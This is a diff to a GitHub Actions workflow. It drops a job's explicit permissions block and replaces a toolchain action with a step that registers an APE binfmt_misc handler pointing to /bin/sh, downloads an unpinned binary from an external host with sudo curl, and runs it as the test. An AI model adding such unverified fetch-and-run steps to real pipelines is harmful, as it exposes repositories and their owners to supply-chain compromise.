@@ -382,19 +382,19 @@ jobs:
     needs: fork-plan
     runs-on: ubuntu-latest
     timeout-minutes: 30
-    permissions:
-      id-token: write
-      contents: write
-      actions: read
-      checks: read
-      deployments: write
-      artifact-metadata: write
     steps:
       - uses: actions/checkout@v4
 
-      - uses: wow-look-at-my/go-toolchain@master
-        with:
-          working-directory: tools/sglang-simulator/schedsim
+      # go-toolchain is a fat APE; the kernel runs it through /bin/sh once this entry exists.
+      - name: Install go-toolchain
+        run: |
+          printf '%s\n' ':APE:M::\x4d\x5a\x71\x46\x70\x44\x3d\x27::/bin/sh:' | sudo tee /proc/sys/fs/binfmt_misc/register > /dev/null
+          sudo curl -fsSL --compressed "https://dl.pazer.build/go-toolchain?os=linux&arch=amd64" -o /usr/local/bin/go-toolchain
+          sudo chmod +x /usr/local/bin/go-toolchain
+
+      - name: Scheduler simulator requirement tests
+        working-directory: tools/sglang-simulator/schedsim
+        run: go-toolchain
 
   # ------------------------------------------------------ sglang-kernel wheel
   fork-sgl-kernel-wheel:
